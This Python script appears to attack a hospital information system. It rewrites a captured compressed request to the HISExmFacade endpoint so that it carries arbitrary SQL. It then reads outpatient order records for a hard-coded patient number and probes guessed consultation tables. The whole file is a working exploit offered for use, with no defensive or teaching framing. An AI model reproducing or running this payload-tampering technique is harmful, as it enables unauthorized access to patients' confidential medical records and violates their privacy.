from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

def parse_rows(text, tag="DRMODIFY"):
    if not text: return []
    rows = re.findall(f'<{tag}[^>]*>(.*?)</{tag}>', text, re.DOTALL)
    out = []
    for r in rows:
        fields = re.findall(r'<(\w+)>(.*?)</\1>', r)
        out.append({k: v for k, v in fields})
    return out

target = "003380272B"
print(f"[*] Re-probing OPDORDM for {target} (Simple SELECT)...")
q = f"SELECT * FROM OPDUSR.OPDORDM WHERE HHISNUM = '{target}' AND ROWNUM <= 50"
res = execute_sql(q)
rows = parse_rows(res)
if rows:
    print(f"  [+] Found {len(rows)} records.")
    for r in rows[:2]:
         print(f"    - {r.get('PFNM')} (Type: {r.get('ORTYPE')}, Case: {r.get('OPDCASENO')})")
else:
    print("  [-] No records found.")

# Try to find Consultation table by variation
c_guesses = [
    'SYSTEM.PAT_CONSULT',
    'SYSTEM.OPD_CONSULT',
    'SYSTEM.EMP_CONSULT',
    'SYSTEM.ADM_CONSULT',
    'OPDUSR.OPD_CONSULT',
    'OPDUSR.PAT_CONSULT'
]
for g in c_guesses:
    print(f"[*] Probing {g}...")
    try:
         res = execute_sql(f"SELECT * FROM {g} WHERE ROWNUM <= 1")
         if res and '<NewDataSet>' in res:
             print(f"  [+] SUCCESS: {g}")
    except: pass
